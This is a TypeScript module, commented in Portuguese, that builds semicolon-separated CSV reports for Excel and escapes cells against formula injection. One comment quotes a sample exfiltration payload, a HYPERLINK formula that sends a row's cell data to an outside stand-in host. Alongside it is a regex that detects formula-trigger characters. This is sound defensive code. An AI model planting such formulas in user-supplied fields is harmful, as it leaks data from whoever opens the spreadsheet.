/**
 * Geração de CSV para o gestor abrir no Excel.
 *
 * Duas decisões que parecem detalhe e não são:
 *
 * 1. Separador `;`. O Excel em português usa a vírgula como separador DECIMAL,
 *    então um CSV separado por vírgula abre tudo numa coluna só. É o motivo
 *    número um de "o relatório veio quebrado".
 *
 * 2. BOM no começo. Sem ele o Excel lê o arquivo como Latin-1 e "Ji-Paraná"
 *    vira "Ji-ParanÃ¡".
 */

export const BOM = '﻿';

/**
 * O que faz a planilha tratar a célula como FÓRMULA em vez de texto.
 *
 * ⚠️ Isto não é firula de formatação, é a defesa contra injeção de fórmula.
 * Quase todo texto que sai daqui foi digitado por gente de fora: `nome` vem do
 * formulário público e da planilha importada, `encaminhamento` vem do atendente,
 * `rua`, `bairro` e a observação de entrega vêm de quem pediu o kit.
 *
 * Um nome gravado como `=HYPERLINK("http://fora/"&A1,"clique")` é célula comum
 * no banco e vira fórmula EXECUTÁVEL no instante em que o gestor abre o CSV no
 * Excel — com a linha inteira ao alcance dela. Aspas sozinhas não resolvem: o
 * Excel avalia a fórmula mesmo dentro de campo aspado.
 */
const RE_FORMULA = /^[=+\-@\t\r]/;

function escapar(valor: unknown): string {
  if (valor === null || valor === undefined) return '';

  if (valor instanceof Date) return valor.toISOString();

  const texto = String(valor);

  // Apóstrofo à frente é o que faz a planilha ler a célula como texto. Vai
  // sempre entre aspas junto, porque o valor perigoso costuma trazer vírgula,
  // aspas e ponto e vírgula dentro.
  //
  // Colateral aqui é nenhum: telefone já sai formatado como (69) 98123-4567 e
  // nenhuma coluna numérica destes relatórios é negativa.
  if (RE_FORMULA.test(texto)) {
    return `"'${texto.replace(/"/g, '""')}"`;
  }

  // Aspas, separador, quebra de linha ou espaço nas pontas exigem aspas.
  if (/[";\n\r]/.test(texto) || texto !== texto.trim()) {
    return `"${texto.replace(/"/g, '""')}"`;
  }
  return texto;
}

export type Coluna<T> = {
  cabecalho: string;
  valor: (linha: T) => unknown;
};

export function gerarCsv<T>(linhas: T[], colunas: Coluna<T>[]): string {
  const cabecalho = colunas.map((c) => escapar(c.cabecalho)).join(';');
  const corpo = linhas.map((l) => colunas.map((c) => escapar(c.valor(l))).join(';'));
  // CRLF é o que o Excel espera.
  return BOM + [cabecalho, ...corpo].join('\r\n') + '\r\n';
}

/** Data e hora em pt-BR, no fuso da operação. */
export function dataHoraLocal(iso: string | null | undefined, timezone: string): string {
  if (!iso) return '';
  return new Intl.DateTimeFormat('pt-BR', {
    timeZone: timezone,
    dateStyle: 'short',
    timeStyle: 'short',
  }).format(new Date(iso));
}
